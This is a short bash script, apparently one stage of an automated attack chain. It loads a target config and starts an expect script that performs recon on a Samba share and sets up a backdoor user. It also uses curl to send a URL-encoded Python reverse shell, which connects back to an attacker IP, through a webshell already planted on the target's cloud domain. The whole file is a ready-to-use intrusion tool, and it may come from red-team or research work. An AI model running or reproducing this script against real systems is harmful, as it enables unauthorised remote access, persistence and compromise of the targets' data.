#!/bin/bash

echo "Loading configs/$1"
source configs/$1

echo "Starting reverse shell listener and expect script ..."
expect_scripts/04_recon_server_expect.sh $REVERSE_SHELL_PORT $TARGET_SAMBA_SHARE $TARGET_SAMBA_USER $TARGET_SAMBA_PW $BACKDOOR_USER $BACKDOOR_USER_PASSWORD &
expect_script=$!

echo "Establishing reverse shell connection ..."
SHELL="python3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22$ATTACKER_IP%22%2C$REVERSE_SHELL_PORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27"

curl https://${TARGET_CLOUD_DOMAIN}/${WEBSHELL_NAME}?feature=shell -d "cwd=.&cmd=$SHELL" 2> /dev/null &

echo "done"

echo "Waiting for recon commands to finish ..."
wait "$expect_script"

echo "finished ..."
